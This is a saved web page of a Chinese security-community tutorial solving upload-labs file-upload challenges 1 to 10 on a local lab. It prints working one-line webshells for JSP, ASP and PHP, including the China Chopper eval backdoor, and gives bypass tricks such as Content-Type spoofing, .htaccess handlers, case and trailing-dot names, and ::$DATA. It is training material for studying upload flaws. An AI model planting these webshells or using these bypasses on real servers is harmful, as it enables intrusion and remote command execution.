+                            <a href="https://xz.aliyun.com/tab/1">安全技术</a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/16">WEB安全</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(6692);">
+             顶(2)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(6692);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                
+                    <p></p><p>先来介绍下文件上传漏洞<br>
+<strong>一. 什么是文件上传漏洞</strong></p>
+<blockquote><p>Web应用程序通常会有文件上传的功能, 例如在 BBS发布图片 , 在个人网站发布ZIP 压缩 包, 在办公平台发布DOC文件等 , 只要 Web应用程序允许上传文件, 就有可能存在文件上传漏洞</p>
+</blockquote>
+<p><strong>二.什么样的网站会有文件上传漏洞</strong></p>
+<blockquote><p>大部分文件上传漏洞的产生是因为Web应用程序没有对上传文件的格式进行严格过滤 , 还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护, 后面我们会讲 到一些常见的解析漏洞, 最后还有一些不常见的其他漏洞, 如 IIS PUT漏洞等</p>
+</blockquote>
+<p><strong>三.文件上传漏洞的危害</strong></p>
+<blockquote><p>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞 , 攻击者甚至可以直接上传一个webshell到服务器上<br>
+ </p><hr><p></p>
+</blockquote>
+<p>关于<strong>webshell</strong></p>
+<blockquote><p>webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。</p>
+</blockquote>
+<p><strong>webshell</strong>的分类</p>
+<blockquote><p>1.根据文件大小分类：大马和小马(通常指的是一句话木马，能够使用菜刀这类工具去直接连接它)<br>
+ 2.根据脚本名称分类：jsp、asp、aspx、php</p>
+</blockquote>
+<p>几种经典的<strong>webshell:</strong></p>
+<p>1）jsp的简单的webshell:</p>
+
+<pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter("i"));%&gt;</code></pre>
+<p>2）asp的简单的webshell:</p>
+
+<pre><code>success!!!!&lt;%eval request("cmd")%&gt;</code></pre>
+<p>3）php的简单的webshell:</p>
+<ul>
+<li><p>php经典一句话: <code>&lt;?php echo shell_exec($_GET['cmd']);?&gt;</code></p>
+<ul>
+<li>中国菜刀：<code>&lt;?php @eval($_POST['自定义密码']);?&gt; 然后连接菜刀就能直接进服务器了</code></li>
+</ul>
+<p>好了介绍完这些就开始做题吧(。・∀・)ノ,</p><hr><p></p>
+</li>
+</ul>
+<p><strong>Less-1</strong><br>
+<a id="img0" href="./论文件上传绕过的各种姿势 - 先知社区_files/2019080418580531.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/2019080418580531.png"></a><br>
+ 先在本地新建一个webshell文件，然后上传webshell 发现失败<br>
+<a id="img1" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190804190905864.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190804190905864.png"></a><br>
+查看源码发现是JS验证，只能上传<code>.jpg|.png|.gif</code>这三种文件格式<br>
+<a id="img2" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190804191122183.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190804191122183.png"></a><br>
+对于js验证有三种绕过方法：</p>
+<ol>
+<li><p>使用浏览器插件。删除检测文件后缀的JS代码，然后上传webshell</p>
+</li>
+<li><p>首先把webshell的后缀改成允许上传的.jpg|.png|.gif，绕过JS检测。再抓包把后缀名改成.php,即可上传webshell</p>
+</li>
+<li><p>在前端js判断函数中加上可以上传php文件,或者直接删去这一函数</p>
+</li>
+</ol>
+<p>由于是第一题，这里就分别用两种方法绕过演示下  (*￣3￣)╭</p>
+<p>先用第2种：<br>
+把webshell的后缀php改为png<br>
+<a id="img3" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190804215416297.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190804215416297.png"></a><br>
+然后上传，抓包修改后缀为php， 然后forward发包<br>
+<a id="img4" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190804215259931.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190804215259931.png"></a><br>
+上传文件url地址可以在这看到（蓝色选中部分），<br>
+<a id="img5" href="./论文件上传绕过的各种姿势 - 先知社区_files/2019080422320517.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/2019080422320517.png"></a><br>
+菜刀连接 地址：<code>http://127.0.0.1/upload-labs-master/upload/webshell.php</code><br>
+<a id="img6" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190804231308328.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190804231308328.png"></a><br>
+成功（￣︶￣）↗　<br>
+<a id="img7" href="./论文件上传绕过的各种姿势 - 先知社区_files/2019080422360040.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/2019080422360040.png"></a><br>
+来看看第三种绕过：</p>
+<p>这时要先猜测判断文件后缀的代码是在前端还是后端，打开burp进行拦截，发现点击上传后，并没有进行发包。可知判断后缀的代码在前端，即用js代码判断的，打开浏览器的审查元素，找到文件上传的js代码<br>
+<a id="img8" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190804224609581.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190804224609581.png"></a><br>
+可以看到蓝色选中区有<code>checkFile()</code>函数，我们把它删除后再上传</p>
+<p>然后同理在F12审查元素中找到路径，菜刀连接。</p>
+<p>第一关结束！（提示：上传到upload文件夹的小马别忘删了，因为下面还要用）</p>
+<p><strong>Less-2</strong></p>
+<p>直接上传，失败，提示文件类型不正确<br>
+<a id="img9" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805154127899.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805154127899.png"></a><br>
+上传图片发现可以成功<br>
+<a id="img10" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805155600556.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805155600556.png"></a><br>
+查看源码：</p>
+
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '文件类型不正确，请重新上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
+    }
+}</code></pre>
+<p>发现这里采用的是后端验证文件类型, 但是他只过滤的文件类型, 并没有过滤文件后缀名, 所以可以上传 php文件，然后修改 content-type 绕过。<br>
+（可能会有小伙伴问，文件后缀名不就定义了我文件类型了吗，嗯...其实并不是，文件后缀只是决定了双击打开的方式，比如你用photoshop可以打开一个psd图像文件。把这个文件扩展名改为txt，再拖到photoshop窗口里，还是一样能打开，说明内容完全没有变化，变化的只是双击时的默认打开方式。）</p>
+<p>可以看到这题的提示：<br>
+<a id="img11" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805160817285.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805160817285.png"></a><br>
+关于MIME我这里要说一下（百度百科<strong>是错的</strong>哦）：</p>
+<blockquote><ul>
+<li>它全名叫多用途互联网邮件扩展（Multipurpose Internet MailExtensions），最初是为了将纯文本格式的电子邮件扩展到可以支持多种信息格式而定制的。后来被应用到多种协议里，包括我们常用的HTTP协议。</li>
+<li><strong>MIME的常见形式是一个主类型加一个子类型，用斜线分隔。比如text/html、application/javascript、image/png等</strong>。</li>
+<li>在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。</li>
+</ul>
+</blockquote>
+<p>这里采用的判断方式就是MIME后端验证！<br>
+这里有两种绕过方法：↓</p>
+<blockquote><p>PS：</p>
+<ul>
+<li>上传php文件时，Content-Type的值是application/octet-stream；</li>
+<li>上传jpg文件时，Content-Type的值是image/jpeg</li>
+</ul>
+</blockquote>
+<ol>
+<li><p>如果服务器通过Content-Type的值判断文件类型，直接上传php文件(webshell)，抓包，将Content-Type的值修改为image/jpeg，即可上传php文件(webshell)。<br>
+<a id="img12" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805170542903.jpg"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805170542903.jpg"></a></p>
+</li>
+<li><p>先上传修改后缀名的webshell（webshell.php改为websshell.jpg）进行、抓包修改，后缀名改为webshell.php<br>
+<a id="img13" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805170131135.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805170131135.png"></a><br>
+然后菜刀连接就行了<code>~(￣▽￣)~*</code></p>
+</li>
+</ol>
+<p><strong>Less-3</strong></p>
+<p>第三题又是一个新类型的题：<strong>黑名单限制文件上传</strong>，不允许上传<code>.asp|.aspx|.php|.jsp</code>后缀文件。那么要如何绕过呢？<br>
+这里说下关于Apache的一些知识：</p>
+<ul>
+<li>Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止</li>
+<li>可以上传例如<code>php3, phtml</code>后缀的文件绕过，前提是<strong>Apache</strong>的<strong>httpd.conf</strong>中配置有如下代码:<br>
+<code>AddType application/x-httpd-php .php .php3 .phtml</code></li>
+</ul>
+<p>服务器会将<code>.php3, .phtml</code>后缀的文件当成<code>.php</code>解析。</p>
+<p>步骤：<br>
+先找到<strong>Apache</strong>下的<strong>httpd.conf</strong>文件，然后查找“AddType text/html”，然后在这行代码后面，加上一行<code>AddType application/x-httpd-php .php .php3 .phtml</code>即可<br>
+<a id="img14" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805234419319.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805234419319.png"></a><br>
+然后直接上传后缀名为<code>.phtml</code>的webshell文件，注意这里上传的文件名会改变<br>
+<a id="img15" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805234628997.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805234628997.png"></a><br>
+连接菜刀<br>
+<a id="img16" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805234742624.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805234742624.png"></a><br>
+成功（￣︶￣）↗　<br>
+<a id="img17" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190805235002925.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190805235002925.png"></a><br>
+下一题<br>
+<strong>Less-4</strong><br>
+同样是黑名单过滤，直接看源码吧：</p>
+
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件不允许上传!';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}</code></pre>
+<p>这题很绝，基本上把那些花里胡哨的后缀都过滤了，但是没有包括<code>.htaccess</code>，可以利用配合Apache的<code>.htaccess</code>文件上传 解析漏洞。</p>
+<blockquote><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在<code>httpd.conf</code>文件中配置。</p>
+</blockquote>
+<p>　<strong>启用<code>.htaccess</code></strong>：<br>
+　需要修改<code>httpd.conf</code>文件下的配置，查找关键词<code>AllowOverride</code>，将后面的<strong>None</strong>改成<strong>All</strong><br>
+<a id="img18" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190806180051350.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190806180051350.png"></a></p>
+<p>然后，上传一个<code>.htaccess</code>内容如下的文件（抓包时删去文件名）:</p>
+
+<pre><code>SetHandler application/x-httpd-php</code></pre>
+<p><a id="img19" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190806180857300.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190806180857300.png"></a><br>
+这样所有文件都会解析为php，然后再上传图片马（我的菜刀好像有问题，就上传图片马吧），就可以解析：</p>
+<p>图片马语句：<code>&lt;?php phpinfo(); ?&gt;</code><br>
+<a id="img20" href="./论文件上传绕过的各种姿势 - 先知社区_files/2019080618233148.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/2019080618233148.png"></a><br>
+成功解析，下一关</p>
+<p><strong>Less-5</strong></p>
+<p>同样是黑名单限制 这关和上一关相比，就多了个<code>.htaccess</code>文件，但是查看源码发现这题没有统一大小写，所以就可以利用<strong>大小写绕过</strong>。<br>
+上传文件<code>webshell.Php</code>，<br>
+<a id="img21" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190806184907184.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190806184907184.png"></a><br>
+上传成功。可以发现文件名又改变了，连接菜刀时要注意哦<br>
+<a id="img22" href="./论文件上传绕过的各种姿势 - 先知社区_files/2019080619020413.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/2019080619020413.png"></a><br>
+连接成功</p>
+<p><strong>Less-6</strong><br>
+查看源码发现还是黑名单，但是这关没有对后缀名进行去空格处理，可在后缀名中加空格绕过</p>
+
+<pre><code>if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
+        $file_name = $_FILES['upload_file']['name'];
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA</code></pre>
+<p>上传的<code>.php</code>文件 抓包加上空格就行了。<br>
+<a id="img23" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190808150945133.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190808150945133.png"></a><br>
+上传成功，查看文件命及路径<br>
+<a id="img24" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190808151244363.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190808151244363.png"></a><br>
+菜刀连接，成功。</p>
+<p><strong>Less-7</strong><br>
+还是黑名单，但是没有对后缀名进行去<code>.</code>处理，，可在后缀名中加<code>.</code>绕过  ；上传后windows下会自动去掉后缀名中最后的<code>.</code><br>
+<a id="img25" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190808153824918.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190808153824918.png"></a><br>
+菜刀连接，成功。</p>
+<p><strong>Less-8</strong><br>
+ 黑名单绕过，对比Less-4可以发现Less8少了这一句；<br>
+<a id="img26" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190808165531516.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190808165531516.png"></a><br>
+在php+windows的情况下：如果文件名+<code>::$DATA</code>,<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名 且保持"<code>::$DATA</code>"之前的文件名。（原因的话不清楚）<br>
+所以这题的绕过方法为：在文件后缀加<code>::$DATA</code><br>
+抓包，加上后缀就行了。<br>
+<a id="img27" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190808165952354.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190808165952354.png"></a><br>
+上传成功。</p>
+<p><strong>Less-9</strong></p>
+<p>我们先来看下Less2的路径拼接代码：</p>
+
+<pre><code>if (move_uploaded_file($_FILES['upload_file']['tmp_name'], UPLOAD_PATH . '/' . $_FILES['upload_file']['name'])) {
+                    $img_path = UPLOAD_PATH . $_FILES['upload_file']['name'];
+                    $is_upload = true;</code></pre>
+<p>再看这一关的代码拼接，</p>
+
+<pre><code>if (move_uploaded_file($_FILES['upload_file']['tmp_name'], UPLOAD_PATH . '/' . $_FILES['upload_file']['name'])) {
+                $img_path = UPLOAD_PATH . '/' . $file_name;
+                $is_upload = true;
+            }</code></pre>
+<p>发现5，6，7，8，9关都是一样，路径拼接的是处理后的文件名，导致可以利用类似<code>.php. .</code>(两个点号之间有一个空格)绕过<br>
+程序先是删除一个点，再删除一个空格经过处理后，文件名变成<code>.php.</code>，即可绕过。<br>
+<a id="img28" href="./论文件上传绕过的各种姿势 - 先知社区_files/2019080818171377.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/2019080818171377.png"></a><br>
+<a id="img29" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190808181823973.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190808181823973.png"></a><br>
+上传成功。</p>
+<p><strong>Less-10</strong><br>
+依旧是黑名单过滤，查看源码：</p>
+
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
+
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = str_ireplace($deny_ext,"", $file_name);
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = UPLOAD_PATH.'/'.$file_name;        
+        if (move_uploaded_file($temp_file, $img_path)) {
+            $is_upload = true;
+        } else {
+            $msg = '上传出错！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}</code></pre>
+<p>注意到，这里是将文件后缀名替换为空，于是可以利用双写绕过(不懂的话，百度下<code>str_ireplace</code>这个函数)：</p>
+
+<pre><code>$file_name = str_ireplace($deny_ext,"", $file_name);</code></pre>
+<p><a id="img30" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190808190553694.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190808190553694.png"></a><br>
+成功上传。<br>
+<a id="img31" href="./论文件上传绕过的各种姿势 - 先知社区_files/20190808190700260.png"><img src="./论文件上传绕过的各种姿势 - 先知社区_files/20190808190700260.png"></a></p>
+<p></p><hr>这次就先总结到这吧，一次不想写太长，后面会补上；觉的我总结的还行的话 求关注呦╰(￣ω￣ｏ)<p></p>
+<p></p>
+                
+            </div>
+            
+
+            <div class="post-user-action">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="6692">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">5</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="6692">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+            <div class="related-section">
+                <div class="related-box">
+                    
+                    <span><a class="pull-left" href="https://xz.aliyun.com/t/6686" title="HTTP参数传递类型差异产生的攻击面"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>HTTP参数传递类型差异产生的攻击面</a></span>
+                    
+                    
+                    <span><a class="pull-left" href="https://xz.aliyun.com/t/6689" title="某Shop供应商后台SQL Injection(一)"><span class="related-label" style="">下一篇：</span>某Shop供应商后台SQL Inj...</a></span>
+                     
+                </div>
+            </div>
+        
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">0 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            <ul>
+                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
+            </ul>
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6692&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6692&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+<div class="box">
+	    <div class="hot-node notice">
+			        <div class="info-body" style="padding: 15px;">
+						            <a href="https://xz.aliyun.com/t/7739" target="_blank">
+										            <img src="./论文件上传绕过的各种姿势 - 先知社区_files/20200508094357-62057bf0-90cd-1.jpg" style="border-radius: 2px;" alt="阿里云情报奖励X计划">
+																	             </a>
+																				         </div>
+																						     </div>
+																						 </div>
+
+
+<div class="box">
+    <div class="hot-node">
+        <div class="info-head" style="border-bottom: 1px solid #ddd;padding: 10px;color: #999;">热门节点</div>
+        <div class="info-body" style="padding: 10px">
+            
+                <a href="https://xz.aliyun.com/node/11" style="padding: 4px 10px 4px 10px;word-break: break-all;line-height: 14px;margin: 0 5px 5px 0;display: inline-block">技术文章</a>
+            
+        </div>
+    </div>
+</div>
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+
+            </div>
+        </div>
+    </div>
+
+
+    
+    <div style="clear: both;"></div>
+
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer">
+    <div class="container text-center">
+        <div class="links">
+            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
+            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
+            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
+            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
+        </div>
+    </div>
+</footer>
+
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6692&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6692&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+        });
+    </script>
+
+
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/z_stat.php" language="JavaScript"></script><script src="./论文件上传绕过的各种姿势 - 先知社区_files/core.php" charset="utf-8" type="text/javascript"></script><a href="https://www.cnzz.com/stat/website.php?web_id=1260716569" target="_blank" title="站长统计">站长统计</a>
+
+
+</body></html>
